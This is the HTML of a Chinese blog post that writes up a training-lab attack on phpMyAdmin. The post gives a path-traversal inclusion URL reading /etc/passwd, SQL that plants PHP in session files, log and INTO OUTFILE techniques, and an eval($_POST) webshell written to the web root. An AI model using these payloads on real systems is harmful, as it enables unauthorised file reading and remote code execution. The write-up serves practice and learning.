@@ -1,0 +1,311 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🐳毅种循环</title>
+<meta name="description" content="</br>西郊有密林，助君出重围。</br>
+</br># WhoAmI</br>
+</br># 毅种循环</br>" />
+<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico?v=1668483625774">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-226932280-1');
+</script>
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://redteamblog.icu">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://redteamblog.icu/images/avatar.png?v=1668483625774" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">🐳毅种循环</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#session%E5%8C%85%E5%90%AB%E5%86%99%E5%85%A5">session包含写入</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E8%87%AA%E5%B7%B1%E7%9A%84sessionid%E5%80%BC">获取自己的sessionID值</a></li>
+</ul>
+</li>
+<li><a href="#getshell">getshell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          😀首页
+        </a>
+      
+    
+      
+        <a href="/posts" class="menu" style="animation-delay: 0.2s">
+          🦉文章列表
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.4s">
+          🤿归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.6000000000000001s">
+          🏄‍♀️标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.8s">
+          👹关于
+        </a>
+      
+    
+      
+        <a href="links/" class="menu" style="animation-delay: 1s">
+          友情链接
+        </a>
+      
+    
+      
+        <a href="/tag/wQ9CEdhmu" class="menu" style="animation-delay: 1.2000000000000002s">
+          🌿随笔
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700"></div>
+    <a class="rss" href="https://redteamblog.icu/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">靶机日志-PHPmyadmin文件包含漏洞</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2022-06-27 / 2 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://api.ixiaowai.cn/api/api.php?=17" alt="">
+        
+        <div class="post-content yue">
+          <p>http://124.70.71.251:42615/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>
+<p>文件包含成功，说明可以存在文件包含漏洞</p>
+<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220625231824-hoyq4o9.png" alt="image.png" loading="lazy"></figure>
+<h3 id="session包含写入">session包含写入</h3>
+<p>执行一个sql语句</p>
+<pre><code class="language-net">select '&lt;?php phpinfo();exit;?&gt;'
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220625233544-pm5sxr8.png" alt="image.png" loading="lazy"></figure>
+<h4 id="获取自己的sessionid值">获取自己的sessionID值</h4>
+<p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p>
+<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220625233703-3b65qvo.png" alt="image.png" loading="lazy"></figure>
+<p>网上很多说写入var目录的，即<code>/var/lib/php/sessions</code></p>
+<p>但是默认情况下，linux数据库文件是没有读取权限的。</p>
+<p>windows下倒是没限制。</p>
+<p>ps:数据库路径可以根据全局参数里的信息来推断。</p>
+<p>2.写入文件来getshell</p>
+<p>要求secure_file_priv不是null，直接通过select &quot;<?php phpinfo();?>&quot; into outfile &quot;xxxxxxxx&quot;，写入shell文件。</p>
+<p>3.写入Log</p>
+<p>普通log:</p>
+<p>set global general_log=1</p>
+<p>set global general_log_file=&quot;路径&quot;</p>
+<pre><code class="language-net">index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_dvuqfhlb5ehvlo75035tb0nkjg7h6vhe
+</code></pre>
+<p>这样写入是会报错的。</p>
+<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/e474e6333630ffc7d9dba75f159676b-20220625234419-1664qwa.png" alt="e474e6333630ffc7d9dba75f159676b.png" loading="lazy"></figure>
+<p>如果没做过设置，session文件默认是在/var/lib/php/sessions/目录下，文件名是sess_加上你的session字段。（没有权限）</p>
+<p>而一般情况下，phpmyadmin的session文件会设置在/tmp目录下，需要在php.ini里把session.auto_start置为1，把session.save_path目录设置为/tmp。</p>
+<p>window下的目录和中间件相关。</p>
+<p>http://124.70.71.251:42615/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_dvuqfhlb5ehvlo75035tb0nkjg7h6vhe</p>
+<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220625232743-ok104wk.png" alt="image.png" loading="lazy"></figure>
+<h3 id="getshell">getshell</h3>
+<p>参考文章：</p>
+<p>以上所说的都是执行的phpinfo，以及get方式执行了命令，无法用蚁剑等工具直接连接shell，所以就想利用文件包含直接生成一个webshell，所以有了以下想法。</p>
+<p>https://blog.csdn.net/weixin_45447309/article/details/106949297</p>
+<p>https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK</p>
+<p>但是此题可以直接写入webshell</p>
+<pre><code class="language-net">select &quot;&lt;?php @eval($_POST['pass']);?&gt;&quot; INTO OUTFILE &quot;/var/www/html/2.php&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/88284c2639c62ba7fde167989d0af49-20220626012936-jasivf7.png" alt="88284c2639c62ba7fde167989d0af49.png" loading="lazy"></figure>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://redteamblog.icu/tag/rOzFKO8rf/">
+            <span class="flex-auto">靶机日志</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://redteamblog.icu/post/我谈我/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  我谈我
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://redteamblog.icu/post/ba-ji-ri-zhi-beecms-xi-tong-lou-dong-fen-xi-su-yuan/">
+                <h3 class="post-title">
+                  靶机日志-BEECMS系统漏洞分析溯源
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://redteamblog.icu/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
